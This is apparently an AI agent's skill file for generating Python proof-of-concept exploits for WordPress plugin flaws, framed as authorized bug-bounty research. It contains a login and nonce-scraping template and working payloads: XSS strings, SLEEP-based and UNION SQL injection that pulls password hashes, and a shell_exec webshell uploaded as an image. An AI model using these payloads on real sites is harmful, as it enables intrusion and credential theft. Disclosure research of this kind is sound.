# Skill: PoC Generator

## Purpose
Generate a working Python proof-of-concept script for a confirmed vulnerability. Self-contained, ready to run against a local test environment.

Save to `AUDIT_DIR/poc/[plugin-slug]-[vuln-type]-poc.py`.
Pipeline mode: `AUDIT_DIR` = `./audit/<slug>/<version>/`. Standalone: `./audit/poc/`.

## Authorized & Responsible Use
This PoC is a **minimal demonstration** of a single confirmed vulnerability, produced for
authorized coordinated-disclosure research (Wordfence Bug Bounty Program) and run **only against
the researcher's local test environment**. It is not weaponized tooling and not for use against
systems the researcher does not own. See `AUTHORIZATION.md` in the project root.

## Script Requirements

1. **Python 3** — stdlib + `requests` only
2. **`argparse` CLI** with standard flags below
3. **Dynamic WordPress URL resolution** — discover paths at runtime via `<link rel='https://api.w.org/'>` tag
4. **Cookie-based auth** — login via `wp-login.php`, capture cookie
5. **Nonce scraping** — for authenticated vulns, scrape the nonce from a page the attacker role can access. If the action nonce is only available on a page requiring higher privileges, the vulnerability is likely OOS (PR:H). See **Nonce Acquisition** section below.
6. **`--insecure`** — disable TLS verification for local/test
7. **`--detect`** — probe without exploiting (where passive check possible)
8. **Clear output** — print what succeeded/failed with verifiable evidence

## Standard CLI Flags

```
--url         Target WordPress base URL (required)
--username    WordPress username (required unless unauth vuln)
--password    WordPress password (required unless unauth vuln)
--detect      Probe without exploit payload. Exit 0=vulnerable, 1=not detected
--insecure    Disable TLS cert verification
--proxy       HTTP proxy (e.g. http://127.0.0.1:8080 for Burp)
--verbose     Print raw HTTP requests/responses
--timeout     Request timeout seconds (default: 15)
--nonce       Pre-scraped nonce value (skip auto-scraping)
```

## Standard Script Structure

```python
#!/usr/bin/env python3
"""
PoC: [Plugin Name] <= [version] — [Vulnerability Type]

Vulnerability:
    [One paragraph — what, where, why exploitable]

Impact:
    [What an attacker gains]

References:
    - Affected file: [plugin-path/file.php], line [N]

Usage:
    # Detect only:
    python poc.py --url https://target.local --detect --insecure

    # Full exploit (authenticated Subscriber):
    python poc.py --url https://target.local --username subscriber --password pass123 --insecure

    # Through Burp proxy:
    python poc.py --url https://target.local --username subscriber --password pass123 \
                  --proxy http://127.0.0.1:8080 --insecure --verbose
"""

import argparse
import re
import sys
import urllib3
import requests
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def normalize_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def discover_wp_paths(session: requests.Session, base_url: str, verbose: bool) -> dict:
    if verbose:
        print(f"[*] Fetching {base_url} to discover WordPress paths...")
    try:
        resp = session.get(base_url, timeout=session.timeout_val)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Failed to reach {base_url}: {e}")
        sys.exit(1)

    rest_base = None
    match = re.search(
        r"<link[^>]+rel=['\"]https://api\.w\.org/['\"][^>]+href=['\"]([^'\"]+)['\"]",
        resp.text, re.IGNORECASE,
    )
    if not match:
        match = re.search(
            r"<link[^>]+href=['\"]([^'\"]+)['\"][^>]+rel=['\"]https://api\.w\.org/['\"]",
            resp.text, re.IGNORECASE,
        )
    if match:
        rest_base = match.group(1).rstrip("/")
        if verbose:
            print(f"[+] REST API base discovered: {rest_base}")
    else:
        for candidate in [urljoin(base_url + "/", "wp-json"), base_url + "/?rest_route=/"]:
            try:
                r = session.get(candidate, timeout=session.timeout_val)
                if r.status_code == 200 and "wp/v2" in r.text:
                    rest_base = candidate.rstrip("/")
                    if verbose:
                        print(f"[+] REST API base (fallback): {rest_base}")
                    break
            except requests.RequestException:
                continue

    if not rest_base:
        print("[!] Could not discover WordPress REST API base URL.")
        print("    Is WordPress installed at this URL? Is the REST API enabled?")
        sys.exit(1)

    parsed = urlparse(rest_base)
    path = parsed.path
    if path.endswith("/wp-json"):
        wp_root = rest_base[: -len("/wp-json")]
    else:
        wp_root = base_url

    home_url   = wp_root
    login_url  = urljoin(wp_root + "/", "wp-login.php")
    ajax_url   = urljoin(wp_root + "/", "wp-admin/admin-ajax.php")

    if verbose:
        print(f"[+] WordPress root:  {home_url}")
        print(f"[+] wp-login.php:    {login_url}")
        print(f"[+] admin-ajax.php:  {ajax_url}")

    return {
        "rest_base":  rest_base,
        "ajax_url":   ajax_url,
        "login_url":  login_url,
        "home_url":   home_url,
    }


def wp_login(session: requests.Session, login_url: str,
             username: str, password: str, verbose: bool) -> bool:
    if verbose:
        print(f"\n[*] Authenticating as '{username}' via {login_url}")
    data = {
        "log": username, "pwd": password, "wp-submit": "Log In",
        "redirect_to": "/wp-admin/", "testcookie": "1",
    }
    session.get(login_url, timeout=session.timeout_val)
    try:
        resp = session.post(login_url, data=data, allow_redirects=True, timeout=session.timeout_val)
    except requests.RequestException as e:
        print(f"[!] Login request failed: {e}")
        return False
    logged_in = any(name.startswith("wordpress_logged_in_") for name in session.cookies.keys())
    if logged_in:
        if verbose:
            print(f"[+] Login successful. Cookies: {list(session.cookies.keys())}")
        return True
    else:
        print(f"[!] Login failed for user '{username}'. Check credentials.")
        if verbose:
            print(f"    Response URL: {resp.url}  Status: {resp.status_code}")
        return False



def scrape_nonce(session: requests.Session, nonce_source_url: str,
                 nonce_action: str, verbose: bool) -> str:
    """Scrape a WordPress nonce from a page the attacker role can access.

    If the nonce for the target action is NOT on any page the attacker role
    can reach, the vulnerability is likely OOS (effective auth floor is higher
    than the attacker role — nonce acts as de facto authorization).
    """
    if verbose:
        print(f"\n[*] Scraping nonce '{nonce_action}' from: {nonce_source_url}")
    try:
        resp = session.get(nonce_source_url, timeout=session.timeout_val)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Could not fetch nonce source page: {e}")
        return None

    patterns = [
        rf"""['"]{re.escape(nonce_action)}['"]\s*:\s*['"]([a-f0-9]{{6,12}})['"]""",
        rf"""data-{re.escape(nonce_action)}=['"]([ a-f0-9]{{6,12}})['"]""",
        rf"""name=['"]{re.escape(nonce_action)}['"][^>]*value=['"]([a-f0-9]{{6,12}})['"]""",
        rf"""value=['"]([a-f0-9]{{6,12}})['"][^>]*name=['"]{re.escape(nonce_action)}['"]""",
    ]
    for pattern in patterns:
        match = re.search(pattern, resp.text, re.IGNORECASE)
        if match:
            nonce = match.group(1)
            if verbose:
                print(f"[+] Nonce found: {nonce}")
            return nonce
    if verbose:
        print(f"[-] Nonce '{nonce_action}' not found on {nonce_source_url}")
    return None


def get_wp_rest_nonce(session: requests.Session, paths: dict, verbose: bool):
    """
    X-WP-Nonce for cookie-authenticated REST API calls.
    WP REST hard-fails (403) with invalid nonce, succeeds silently with none.
    After calling: session.headers.update({"X-WP-Nonce": nonce})
    """
    candidates = [
        paths["home_url"] + "/wp-admin/post-new.php",
        paths["home_url"] + "/wp-admin/widgets.php",
        paths["home_url"] + "/wp-admin/",
    ]
    patterns = [
        r'createNonceMiddleware\(\s*["\']([a-f0-9]{10,12})["\']',
        r'wpApiSettings\s*=\s*\{[^}]{0,300}"nonce"\s*:\s*"([a-f0-9]{10,12})"',
    ]
    for url in candidates:
        try:
            r = session.get(url, timeout=session.timeout_val)
        except requests.RequestException:
            continue
        for pat in patterns:
            m = re.search(pat, r.text)
            if m:
                nonce = m.group(1)
                if verbose:
                    print(f"[+] REST nonce acquired from {url}: {nonce}")
                return nonce
    if verbose:
        print("[-] REST nonce not found — proceeding without X-WP-Nonce")
    return None


def make_session(insecure: bool, proxy, timeout: int) -> requests.Session:
    session = requests.Session()
    session.verify = not insecure
    session.timeout_val = timeout
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
    })
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        print(f"[*] Proxy active: {proxy}")
    if insecure:
        print("[!] TLS verification disabled (--insecure). Do not use against production.")
    return session


def rest_url(rest_base: str, endpoint: str) -> str:
    """Build REST endpoint URL for both pretty (/wp-json/) and ugly (?rest_route=) forms."""
    endpoint = endpoint.lstrip("/")
    if "rest_route=" in rest_base:
        return rest_base.rstrip("/") + "/" + endpoint
    return urljoin(rest_base.rstrip("/") + "/", endpoint)


# ─── VULNERABILITY SPECIFIC ──────────────────────────────────────────────────
# Replace detect() and exploit() below. Everything above is reused verbatim.

def detect(session: requests.Session, paths: dict, args: argparse.Namespace) -> bool:
    """Passive probe. Return True if vulnerable, False otherwise."""
    print("\n[*] Running detection probe...")
    # --- Replace with actual detection logic ---
    probe_url = paths["ajax_url"]
    data = {"action": "[AJAX_ACTION_NAME]"}
    try:
        resp = session.post(probe_url, data=data, timeout=session.timeout_val)
    except requests.RequestException as e:
        print(f"[!] Probe request failed: {e}")
        return False
    if args.verbose:
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:300]}")
    if resp.status_code == 200 and "[INDICATOR_OF_VULNERABLE_RESPONSE]" in resp.text:
        print("[+] VULNERABLE: Endpoint responds as expected for exploitation.")
        print(f"    Evidence: status={resp.status_code}, body snippet: {resp.text[:120]}")
        return True
    else:
        print("[-] NOT DETECTED: Endpoint did not respond as expected.")
        print(f"    Status: {resp.status_code}, body snippet: {resp.text[:120]}")
        return False


def exploit(session: requests.Session, paths: dict, args: argparse.Namespace) -> bool:
    """Send exploit payload and confirm success. Return True if confirmed."""
    print("\n[*] Sending exploit payload...")
    # --- Replace with actual exploit logic ---
    payload = "[EXPLOIT_PAYLOAD]"
    target_url = paths["ajax_url"]
    data = {
        "action": "[AJAX_ACTION_NAME]",
        "[PARAM]": payload,
    }
    if args.verbose:
        print(f"    POST {target_url}")
        print(f"    Data: {data}")
    try:
        resp = session.post(target_url, data=data, timeout=session.timeout_val)
    except requests.RequestException as e:
        print(f"[!] Exploit request failed: {e}")
        return False
    if args.verbose:
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:500]}")
    if "[INDICATOR_OF_SUCCESSFUL_EXPLOITATION]" in resp.text:
        print("[+] EXPLOITED: Payload confirmed in response.")
        print(f"    Evidence: {resp.text[:200]}")
        return True
    else:
        print("[-] Exploit did not confirm. Response did not contain expected indicator.")
        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:200]}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC: [Plugin Name] <= [version] — [Vulnerability Type]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python poc.py --url https://target.local --detect --insecure
  python poc.py --url https://target.local --username subscriber --password pass --insecure
  python poc.py --url https://target.local --username subscriber --password pass \\
                --proxy http://127.0.0.1:8080 --insecure --verbose
        """,
    )
    parser.add_argument("--url",      required=True, help="Target WordPress base URL")
    parser.add_argument("--username", default=None, help="WordPress username")
    parser.add_argument("--password", default=None, help="WordPress password")
    parser.add_argument("--detect",   action="store_true", help="Probe without exploiting")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS cert verification")
    parser.add_argument("--proxy",    default=None, help="HTTP proxy")
    parser.add_argument("--verbose",  action="store_true", help="Print raw requests/responses")
    parser.add_argument("--timeout",  type=int, default=15, help="Request timeout seconds")
    parser.add_argument("--nonce",    default=None, help="Pre-scraped nonce value (skip auto-scraping)")
    # --- Add vulnerability-specific flags here ---

    args = parser.parse_args()
    args.url = normalize_url(args.url)
    session  = make_session(args.insecure, args.proxy, args.timeout)
    print(f"[*] Target: {args.url}")

    paths = discover_wp_paths(session, args.url, args.verbose)

    # Authentication (comment out for unauthenticated vulns)
    if not args.username or not args.password:
        parser.error("--username and --password are required for this vulnerability.")
    if not wp_login(session, paths["login_url"], args.username, args.password, args.verbose):
        sys.exit(1)

    # REST API nonce (uncomment for REST API vulns only)
    # nonce = get_wp_rest_nonce(session, paths, args.verbose)
    # if nonce:
    #     session.headers.update({"X-WP-Nonce": nonce})

    if args.detect:
        vulnerable = detect(session, paths, args)
        sys.exit(0 if vulnerable else 1)
    else:
        success = exploit(session, paths, args)
        sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
```

## Vulnerability-Type Patterns

### XSS (Stored)
- detect(): send probe value, fetch rendering page, confirm unescaped in HTML
- exploit(): send payload, fetch rendering page, confirm `<script>` in raw HTML
- Context-aware payloads: JS context `';alert(document.domain);//`, HTML context `<img src=x onerror=alert(document.domain)>`

### XSS (Reflected)
- detect()/exploit(): send payload in vulnerable param, check response body
- Print trigger URL: `f"{target_url}?{param}={payload}"`

### SQL Injection (Error-based)
- detect(): `value=1` vs `value=1'` — different response length/error
- exploit(): UNION-based → extract `wp_users.user_login` + `user_pass`

### SQL Injection (Blind/Time-based)
```python
import time
start = time.time()
session.post(url, data={param: "1 AND SLEEP(3)-- -"}, timeout=15)
elapsed = time.time() - start
if elapsed >= 2.8:
    print(f"[+] Time-based SQLi confirmed ({elapsed:.1f}s delay)")
```

### SQL Injection (ORDER BY)
```python
payloads = ["1", "(SELECT 1)", "1 DESC-- -"]
```

### Arbitrary File Upload
```python
WEBSHELL_NAME = "wp_shell_probe.php"
WEBSHELL_CODE = b"<?php echo 'rce_probe:'.shell_exec($_GET['cmd']);?>"
files = {"file": (WEBSHELL_NAME, WEBSHELL_CODE, "image/jpeg")}
# After upload: resp = session.get(webshell_url + "?cmd=id")
# if "rce_probe:" in resp.text: ← confirmed RCE
```

### Missing Authorization / BAC
```python
# detect(): request as unauth/Subscriber, check response
PATCHED_INDICATORS = ["-1", "0", "false", "Forbidden", "not allowed"]
```

### PHP Object Injection
```python
# PHP serialized payload as raw string constant
PAYLOAD = 'O:8:"[Class]":1:{s:4:"[prop]";s:[len]:"[value]";}'
```

### SSRF
```python
CALLBACK_URL = "http://[YOUR_INTERACTSH_OR_BURP_COLLABORATOR_URL]"
```

## Nonce Acquisition

WordPress nonces are CSRF tokens tied to user identity. They are computed server-side using secrets from `wp-config.php` (NONCE_KEY + NONCE_SALT). A PoC must obtain the nonce through HTTP requests that the attacker role can make — **never** via server access or wp-config.php secrets.

### Critical rule: nonce accessibility determines auth floor
If the action nonce is **only** embedded on a page requiring higher privileges (e.g., an admin page gated by `manage_options`), the nonce acts as de facto authorization. The vulnerability's effective auth floor is the privilege required to access that page, not the handler's missing `current_user_can()` check. This likely makes the finding OOS (PR:H).

**Before writing a PoC**, verify that the action nonce is accessible at the claimed attacker role:
1. Check where `wp_create_nonce('action_name')` is called — what page/template embeds it?
2. Check what capability gates that page — does the attacker role have access?
3. Check if the nonce is localized via `wp_localize_script` on any page the role can reach
4. If no accessible nonce source exists → the finding is likely a false positive at the claimed auth level

### When to use `scrape_nonce()`
Use when the nonce IS available on a page the attacker role can access (e.g., plugin localizes the nonce via `wp_localize_script` on a frontend page or a wp-admin page the role can reach).

### When to use `get_wp_rest_nonce()`
Use for REST API vulnerabilities — the `wp_rest` nonce is always available on any wp-admin page the logged-in user can access.

### PoC convention
- Include `--nonce` in argparse as an optional override (skip auto-scraping)
- In detect/exploit, try `args.nonce` first, then `scrape_nonce()` from the identified accessible page
- Document which page the nonce is scraped from and why the attacker role can access it

## Output Standards

Prefixes: `[*]` info, `[+]` success, `[-]` negative, `[!]` error/warning

End-of-script must print one of:
```
[+] EXPLOITED: [what was achieved and evidence]
[-] NOT EXPLOITED: [what was observed instead]
[+] VULNERABLE DETECTED: [evidence from probe]
[-] NOT DETECTED: [what was observed]
```

Never print "success" or "vulnerable" without a concrete, verifiable response indicator.

## WordPress Parsing Notes

- HTML attributes may use single quotes: `name='post_ID' value='42'` → use `['\"]` in regex
- Nonce extraction: use `str.find('objectName')` + 300-char chunk + `r'"nonce":"([^"]+)"'` (no `\s*`, no fixed length)
- For Elementor editor context: extract auto-draft `post_ID` from `post-new.php` hidden field (don't POST to create drafts — returns 403)

## Prohibitions

- No hardcoded target URLs, credentials, or IPs
- No `subprocess`, `selenium`, `playwright`, `os.system()`, `eval()`
- No claiming exploitation without response evidence
- No actual malware — webshells use obvious marker prefix (e.g. `POC_RCE:`)
- No `[PLACEHOLDER]` strings in the final saved script
